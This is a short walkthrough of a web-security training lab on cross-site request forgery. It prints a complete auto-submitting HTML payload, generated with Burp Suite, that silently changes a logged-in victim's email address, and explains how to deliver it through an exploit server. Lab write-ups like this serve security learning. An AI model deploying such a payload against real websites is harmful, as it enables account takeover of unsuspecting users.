# Lab: CSRF vulnerability with no defenses

Login with the provided creds and initiate an email address change. From the resulting POST request, right click and select Engagement Tools > Generate CSRF PoC

Copy the generated html and modify it to remove the submit button, and add a script block to submit the change:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac7c1f3c1f55fa33c04822f800cc008a.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;pwned&#46;com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

Go to the exploit server and store the payload, then deliver it to the victim to solve the lab. When the victim visits the exploit link, a POST request is initiated with the email change parameters on the target website. The victim's browser automatically uses the user's cookie, so the attack results in the website accepting the change.